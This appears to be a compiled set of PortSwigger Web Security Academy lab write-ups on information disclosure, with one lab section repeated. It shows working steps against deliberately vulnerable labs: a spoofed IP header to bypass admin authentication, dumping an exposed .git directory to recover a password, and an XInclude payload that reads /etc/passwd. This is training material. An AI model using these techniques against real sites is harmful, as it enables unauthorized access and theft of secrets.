\#01 Information disclosure in error messages
=============================================

This lab's verbose error messages reveal that it is using a vulnerable version
of a third-party framework. To solve the lab, obtain and submit the version
number of this framework.

References:

-   https://portswigger.net/web-security/information-disclosure/exploiting

![ ](media/f539feaaca5084e26aabec8545815060.png)

 

To generate an error I sent a string in the following request, which expects an
integer:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /product?productId=aaa
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![ ](media/4e80a8db381bc612bff38e8019a12b05.png)

 

\#02 Information disclosure on debug page
=========================================

This lab contains a debug page that discloses sensitive information about the
application. To solve the lab, obtain and submit the SECRET_KEY environment
variable.

References:

-   https://portswigger.net/web-security/information-disclosure/exploiting

![ ](media/775f91a18ece794a22563e100b863c0e.png)

 

We find the debug page in “/cgi-bin/phpinfo.php”:

![ ](media/651b1673c75115dd368b2b15f06d3b12.png)

 

We can find the secret key ("8f4xrr692ckcxycofkaupwwu37cse6io") in the
“Environment” section:

![ ](media/25c4eccbde8bfd45f90084ad6051711e.png)

 

\#03 Source code disclosure via backup files
============================================

This lab leaks its source code via backup files in a hidden directory. To solve
the lab, identify and submit the database password, which is hard-coded in the
leaked source code.

References:

-   https://portswigger.net/web-security/information-disclosure/exploiting

![ ](media/c627c253927b9d4958df6930d847bb4d.png)

 

There is a /robots.txt file:

![ ](media/dfafd8c22bc14aa03e4361898b828b41.png)

 

There is a /backup endpoint:

![ ](media/5d048b2166af6a652569c0eea734262a.png)

 

We can read the file and fine the database password
“td510drfnep124ibalwc0xw32d1cp3or”:

![ ](media/f0c783a84884d1a6c3212d1df7ffc0e7.png)

 

\#04 Authentication bypass via information disclosure
=====================================================

This lab's administration interface has an authentication bypass vulnerability,
but it is impractical to exploit without knowledge of a custom HTTP header used
by the front-end.

To solve the lab, obtain the header name then use it to bypass the lab's
authentication. Access the admin interface and delete Carlos's account.

You can log in to your own account using the following credentials: wiener:peter

References:

-   https://portswigger.net/web-security/information-disclosure/exploiting

![ ](media/103595477f2e13e3254a36eff73e94c5.png)

 

After logging in, send a request with the TRACE HTTP method, which reveals the
header “X-Custom-IP-Authorization”:

![ ](media/683c7f9bc4cfc54910d35b32be292708.png)

 

It is possible to access /admin with:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /admin HTTP/2
...
X-Custom-Ip-Authorization: 127.0.0.1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![ ](media/912d8aac5cb87eaf4b0e9f66bb33b5f8.png)

 

And then delete the user with:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /admin/delete?username=carlos HTTP/2
...
X-Custom-Ip-Authorization: 127.0.0.1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![ ](media/48243dfe09b40918bf23aafdb7ec2005.png)

 

\#05 Information disclosure in version control history
======================================================

This lab discloses sensitive information via its version control history. To
solve the lab, obtain the password for the administrator user then log in and
delete Carlos's account.

Reference:
https://portswigger.net/web-security/information-disclosure/exploiting

![ ](media/508de90e71b49bcf285c26aaadb16849.png)

 

Generated link:
https://0afa00c404fb4d8581880c60002e004e.web-security-academy.net/

The directory .git/ exists and allows directory listing:

![ ](media/73a9c93e6299917e523e536cf12eaf9d.png)

 

Download the gitdumper script
(https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh)
and then the .git repo:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash gitdumper.sh https://0afa00c404fb4d8581880c60002e004e.web-security-academy.net/.git/ /tmp/a/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![ ](media/28787ba1769bf910c32fabb130e89847.png)

 

There are sensitive files deleted in the latest commit:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cd /tmp/a
git status
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![ ](media/72e7a965719aa467f0d838992dbcd79b.png)

 

Then we revert the previous commit and read the file:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
git log
git reset --hard d3e84943424222ce64de7da0d797b7dfdef39ea1
cat admin.conf
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![ ](media/9978d2bf8768ee7a731013d832f4d1c4.png)

 

Then we access with credentials administrator:wy0szsn75q5jqn0w70bu and delete
the user:

![ ](media/c7b4cb51ba9b46848c178d19cd075ee9.png)

 


# 21 - Information disclosure in version control history

This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the administrator user then log in and delete Carlos's account.

---------------------------------------------

Reference: https://portswigger.net/web-security/information-disclosure/exploiting



![ ](images/21%20-%20Information%20disclosure%20in%20version%20control%20history/1.png)

---------------------------------------------

Generated link: https://0afa00c404fb4d8581880c60002e004e.web-security-academy.net/

The directory .git/ exists and allows directory listing:



![ ](images/21%20-%20Information%20disclosure%20in%20version%20control%20history/2.png)

Download the gitdumper script (https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh) and then the .git repo:

```
bash gitdumper.sh https://0afa00c404fb4d8581880c60002e004e.web-security-academy.net/.git/ /tmp/a/
```



![ ](images/21%20-%20Information%20disclosure%20in%20version%20control%20history/3.png)

There are sensitive files deleted in the latest commit:

```
cd /tmp/a
git status
```



![ ](images/21%20-%20Information%20disclosure%20in%20version%20control%20history/4.png)

Then we revert the previous commit and read the file:

```
git log
git reset --hard d3e84943424222ce64de7da0d797b7dfdef39ea1
cat admin.conf
```



![ ](images/21%20-%20Information%20disclosure%20in%20version%20control%20history/5.png)

Then we access with credentials administrator:wy0szsn75q5jqn0w70bu and delete the user:



![ ](images/21%20-%20Information%20disclosure%20in%20version%20control%20history/6.png)


# 23 - Discovering vulnerabilities quickly with targeted scanning

This lab contains a vulnerability that enables you to read arbitrary files from the server. To solve the lab, retrieve the contents of /etc/passwd within 10 minutes.

Due to the tight time limit, we recommend using Burp Scanner to help you. You can obviously scan the entire site to identify the vulnerability, but this might not leave you enough time to solve the lab. Instead, use your intuition to identify endpoints that are likely to be vulnerable, then try running a targeted scan on a specific request. Once Burp Scanner has identified an attack vector, you can use your own expertise to find a way to exploit it.

Hint: If you get stuck, try looking up our Academy topic on the identified vulnerability class.


---------------------------------------------

References: 

- https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing

- https://portswigger.net/web-security/xxe



![img](images/23%20-%20Discovering%20vulnerabilities%20quickly%20with%20targeted%20scanning/1.png)

---------------------------------------------

Generated link: 



![img](images/23%20-%20Discovering%20vulnerabilities%20quickly%20with%20targeted%20scanning/2.png)

We know this payload works:

```
<njd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://itfjkky610emxm8w1amzh40dm4sygp4qsif83x.oastify.com/foo"/></njd>
```

So we will try:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

The POST request will be:

```
POST /product/stock HTTP/2
...

productId=%3c%66%6f%6f%20%78%6d%6c%6e%73%3a%78%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%49%6e%63%6c%75%64%65%22%3e%3c%78%69%3a%69%6e%63%6c%75%64%65%20%70%61%72%73%65%3d%22%74%65%78%74%22%20%68%72%65%66%3d%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%2f%3e%3c%2f%66%6f%6f%3e&storeId=1
```



![img](images/23%20-%20Discovering%20vulnerabilities%20quickly%20with%20targeted%20scanning/3.png)



![img](images/23%20-%20Discovering%20vulnerabilities%20quickly%20with%20targeted%20scanning/4.png)
